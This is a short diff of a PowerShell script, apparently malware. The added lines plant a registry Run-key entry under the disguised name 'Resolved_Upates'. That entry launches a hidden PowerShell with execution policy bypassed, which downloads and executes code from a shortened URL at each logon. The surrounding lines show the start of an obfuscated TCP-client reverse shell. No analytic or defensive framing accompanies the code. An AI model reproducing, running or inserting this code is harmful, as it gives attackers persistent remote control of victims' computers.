@@ -1,3 +1,5 @@
+$command = 'Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/OjiMT | iex`""'
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Resolved_Upates" -Value $command
 $h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
 $ipAddr = ([System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).ToString()
 $c = New-Object ($h) ($i, $p)
